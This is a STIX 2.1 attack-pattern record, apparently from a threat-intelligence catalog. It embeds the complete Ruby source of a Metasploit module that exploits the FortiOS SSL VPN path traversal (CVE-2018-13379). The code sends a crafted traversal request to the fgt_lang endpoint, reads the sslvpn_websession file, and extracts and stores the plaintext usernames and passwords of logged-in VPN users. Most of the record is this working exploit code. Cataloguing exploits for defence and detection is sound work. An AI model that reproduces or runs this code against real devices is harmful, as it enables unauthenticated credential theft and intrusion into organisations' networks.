{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--11f53397-c1a6-4017-a567-cda2a2812bfb",
    "created": "2024-08-14T16:32:37.372869Z",
    "modified": "2024-08-14T16:32:37.372872Z",
    "name": "FortiOS Path Traversal Credential Gatherer",
    "description": " Fortinet FortiOS versions 5.4.6 to 5.4.12, 5.6.3 to 5.6.7 and 6.0.0 to 6.0.4 are vulnerable to a path traversal vulnerability within the SSL VPN web portal which allows unauthenticated attackers to download FortiOS system files through specially crafted HTTP requests.  This module exploits this vulnerability to read the usernames and passwords of users currently logged into the FortiOS SSL VPN, which are stored in plaintext in the \"/dev/cmdb/sslvpn_websession\" file on the VPN server.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/fortios_vpnssl_traversal_creds_leak.rb",
            "external_id": "fortios_vpnssl_traversal_creds_leak.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.fortiguard.com/psirt/FG-IR-18-384"
        },
        {
            "source_name": "reference",
            "url": "https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/"
        }
    ],
    "x_code_snippet": "# frozen_string_literal: true\n\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'FortiOS Path Traversal Credential Gatherer',\n        'Description' => %q{\n          Fortinet FortiOS versions 5.4.6 to 5.4.12, 5.6.3 to 5.6.7 and 6.0.0 to\n          6.0.4 are vulnerable to a path traversal vulnerability within the SSL VPN\n          web portal which allows unauthenticated attackers to download FortiOS system\n          files through specially crafted HTTP requests.\n\n          This module exploits this vulnerability to read the usernames and passwords\n          of users currently logged into the FortiOS SSL VPN, which are stored in\n          plaintext in the \"/dev/cmdb/sslvpn_websession\" file on the VPN server.\n        },\n        'References' => [\n          %w[CVE 2018-13379],\n          %w[EDB 47287],\n          %w[EDB 47288],\n          ['URL', 'https://www.fortiguard.com/psirt/FG-IR-18-384'],\n          ['URL', 'https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf'],\n          ['URL', 'https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/']\n        ],\n        'Author' => [\n          'Meh Chang', # discovery and PoC\n          'Orange Tsai', # discovery and PoC\n          'lynx (Carlos Vieira)', # initial module author from edb\n          'mekhalleh (RAMELLA S\u00e9bastien)' # Metasploit module author (Zeop Entreprise)\n        ],\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'DefaultOptions' => {\n          'RPORT' => 10_443,\n          'SSL' => true\n        }\n      )\n    )\n\n    register_options([\n      OptEnum.new('DUMP_FORMAT', [true, 'Dump format.', 'raw', %w[raw ascii]]),\n      OptBool.new('STORE_CRED', [false, 'Store credential into the database.', true]),\n      OptString.new('TARGETURI', [true, 'Base path', '/remote'])\n    ])\n  end\n\n  def execute_request\n    payload = '/../../../..//////////dev/cmdb/sslvpn_websession'\n\n    uri = normalize_uri(target_uri.path, 'fgt_lang')\n    begin\n      response = send_request_cgi(\n        {\n          'method' => 'GET',\n          'uri' => uri,\n          'vars_get' => {\n            'lang' => payload\n          }\n        }\n      )\n    rescue StandardError => e\n      print_error(message(e.message.to_s))\n      return nil\n    end\n\n    unless response\n      print_error(message('No reply.'))\n      return nil\n    end\n\n    if response.code != 200\n      print_error(message('NOT vulnerable!'))\n      return nil\n    end\n\n    if response.body =~ /var fgt_lang/\n      print_good(message('Vulnerable!'))\n      report_vuln(\n        host: @ip_address,\n        name: name,\n        refs: references\n      )\n      return response.body if datastore['STORE_CRED'] == true\n    end\n\n    nil\n  end\n\n  def message(msg)\n    \"#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}\"\n  end\n\n  def parse_config(chunk)\n    chunk = chunk.split(\"\\x00\").reject(&:empty?)\n\n    return if chunk[1].nil? || chunk[2].nil?\n\n    {\n      ip: @ip_address,\n      port: datastore['RPORT'],\n      service_name: @proto,\n      user: chunk[1],\n      password: chunk[2]\n    }\n  end\n\n  def report_creds(creds)\n    creds.each do |cred|\n      cred = cred.gsub('\"', '').gsub(/[{}:]/, '').split(', ')\n      cred = cred.map do |h|\n        h1, h2 = h.split('=>')\n        { h1 => h2 }\n      end\n      cred = cred.reduce(:merge)\n\n      cred = JSON.parse(cred.to_json)\n\n      next unless cred && (!cred['user'].blank? && !cred['password'].blank?)\n\n      service_data = {\n        address: cred['ip'],\n        port: cred['port'],\n        service_name: cred['service_name'],\n        protocol: 'tcp',\n        workspace_id: myworkspace_id\n      }\n\n      credential_data = {\n        origin_type: :service,\n        module_fullname: fullname,\n        username: cred['user'],\n        private_data: cred['password'],\n        private_type: :password\n      }.merge(service_data)\n\n      login_data = {\n        core: create_credential(credential_data),\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }.merge(service_data)\n\n      create_credential_login(login_data)\n    end\n  end\n\n  def run_host(ip)\n    @proto = (ssl ? 'https' : 'http')\n    @ip_address = ip\n\n    print_status(message('Trying to connect.'))\n    data = execute_request\n    if data.nil?\n      print_error(message('No data received.'))\n      return\n    end\n\n    loot_data = case datastore['DUMP_FORMAT']\n                when /ascii/\n                  data.gsub(/[^[:print:]]/, '.')\n                else\n                  data\n                end\n    loot_path = store_loot('', 'text/plain', @ip_address, loot_data, '', '')\n    print_good(message(\"File saved to #{loot_path}\"))\n\n    return if data.length < 110\n\n    if data[73] == \"\\x01\"\n      separator = data[72..73]\n    elsif data[105..109] == \"\\x00\\x00\\x00\\x00\\x01\"\n      separator = data[104..109]\n    end\n    data = data.split(separator)\n\n    creds = []\n    data.each_with_index do |chunk, index|\n      next unless index.positive?\n\n      next if chunk[0] == \"\\x00\" || !chunk[0].ascii_only?\n\n      creds << parse_config(chunk).to_s\n    end\n    creds = creds.uniq\n\n    return unless creds.length.positive?\n\n    print_good(message(\"#{creds.length} credential(s) found!\"))\n    report_creds(creds)\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}